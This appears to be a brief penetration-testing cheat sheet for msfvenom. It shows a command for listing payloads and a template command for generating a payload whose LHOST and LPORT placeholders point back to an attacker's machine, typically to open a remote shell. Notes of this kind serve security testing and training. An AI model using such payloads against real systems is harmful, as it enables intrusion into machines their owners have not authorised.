
# Msfvenom

## List Payloads

	msfvenom -l payloads
	
## Load Payload

	msfvenom -p <payload> -a <target_architecture (x86,x64)> --platform <target_os> -f <file_format> LHOST=<attacker_ip> LPORT=<listening_port> -o <output_file>

